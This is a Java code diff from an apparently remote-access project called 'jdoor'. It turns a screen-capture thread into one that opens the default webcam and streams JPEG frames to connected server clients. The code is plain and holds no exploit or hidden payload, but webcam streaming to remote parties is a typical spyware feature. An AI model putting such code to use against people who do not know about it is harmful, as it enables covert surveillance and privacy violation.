@@ -1,43 +1,38 @@
-package com.jdoor.server.screen;
+package com.jdoor.server.webcam;
 
+import com.github.sarxos.webcam.Webcam;
 import com.jdoor.server.ServerThread;
+import com.jdoor.server.screen.ScreenCaptureThread;
 
 import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
-import java.io.*;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.IOException;
 import java.util.ArrayList;
 
-/**
- * Thread per mandare lo screen delo schermo.
- * Ne esiste uno solo che viene creato all'inizio del programma.
- */
-public class ScreenCaptureThread extends Thread {
-    private static ScreenCaptureThread currentInstance;
+import static com.jdoor.Constants.WEBCAM_CAPTURE_SIZE;
 
-    public static String SCREEN_SIZE;
+public class WebcamCaptureThread extends Thread{
+    private static WebcamCaptureThread currentInstance;
 
-    private final Robot robot;
-    private final Rectangle screenRectangle;
+    private final Webcam webcam;
 
     private final ArrayList<ServerThread> threads;
     private boolean running;
 
-    private ScreenCaptureThread() throws AWTException {
-        robot = new Robot();
-        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
-        screenRectangle = new Rectangle(screenSize);
-
+    private WebcamCaptureThread(){
+        webcam = Webcam.getDefault();
+        webcam.setViewSize(new Dimension(176, 144));
+        webcam.open();
         threads = new ArrayList<>();
-
-        SCREEN_SIZE = screenSize.width + "x" + screenSize.height;
-
         running = true;
     }
 
-    public static synchronized ScreenCaptureThread getScreenCaptureThread() throws AWTException {
+    public static synchronized WebcamCaptureThread getWebcamCaptureThread(){
         if (currentInstance == null)
-            currentInstance = new ScreenCaptureThread();
+            currentInstance = new WebcamCaptureThread();
 
         return currentInstance;
     }
@@ -49,17 +44,14 @@ public class ScreenCaptureThread extends Thread {
 
     // Metodo provato per ottenere una schermata.
     private byte[] getScreen() {
-        BufferedImage image = robot.createScreenCapture(screenRectangle);
-
-        byte[] buffer;
+        BufferedImage image = webcam.getImage();
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         try {
             ImageIO.write(image, "jpg", byteArrayOutputStream);
         } catch (IOException ioe) {
             ioe.printStackTrace();
         }
-        buffer = byteArrayOutputStream.toByteArray();
-        return buffer;
+        return byteArrayOutputStream.toByteArray();
     }
 
     // Metodo per fermare il thread.
@@ -83,7 +75,7 @@ public class ScreenCaptureThread extends Thread {
                 // Mandare la schermata.
                 for (ServerThread thread : threads) {
                     if(thread.isWatching()) {
-                        thread.sendScreen(capture);
+                        thread.sendWebcam(capture);
                     }
                 }
             }
